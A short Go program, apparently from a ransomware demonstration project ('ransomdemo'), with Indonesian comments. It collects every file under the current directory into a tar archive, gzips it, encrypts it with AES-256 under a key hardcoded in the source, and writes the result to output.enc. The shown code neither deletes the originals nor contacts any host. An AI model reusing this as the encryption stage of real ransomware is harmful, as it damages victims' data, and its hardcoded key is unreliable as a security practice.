package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"os"
	"path/filepath"

	"github.com/indomy/ransomdemo/pkg"
)

func main() {
	// Direktori yang ingin dikompresi dan dienkripsi
	dir := "."

	// Buat buffer untuk menyimpan data tar
	var tarData bytes.Buffer
	tarWriter := tar.NewWriter(&tarData)

	// Tambahkan semua file dan folder dari direktori ke arsip tar
	err := filepath.Walk(dir, func(file string, fi os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Abaikan direktori itu sendiri
		if fi.IsDir() {
			return nil
		}
		// Baca file
		data, err := os.ReadFile(file)
		if err != nil {
			return err
		}

		// Buat header tar
		header := &tar.Header{
			Name: file,
			Size: fi.Size(),
			Mode: int64(fi.Mode()),
		}

		// Tulis header dan data file ke arsip tar
		if err := tarWriter.WriteHeader(header); err != nil {
			return err
		}
		if _, err := tarWriter.Write(data); err != nil {
			return err
		}

		return nil
	})

	if err != nil {
		println(err)
		panic(err)
	}
	tarWriter.Close()

	// Kompresi arsip tar menggunakan gzip
	var compressedData bytes.Buffer
	gzipWriter := gzip.NewWriter(&compressedData)
	_, err = gzipWriter.Write(tarData.Bytes())
	if err != nil {
		panic(err)
	}
	gzipWriter.Close()

	// Enkripsi data yang sudah dikompresi menggunakan AES
	key := []byte("passphrasewhichneedstobe32bytes!") // 32 bytes key for AES-256
	encryptedData, err := pkg.Encrypt(compressedData.Bytes(), key)
	if err != nil {
		panic(err)
	}

	// Simpan data terenkripsi ke file
	outputFile := "output.enc"
	err = os.WriteFile(outputFile, encryptedData, 0644)
	if err != nil {
		panic(err)
	}

	println("File berhasil dikompresi dan dienkripsi!")
}
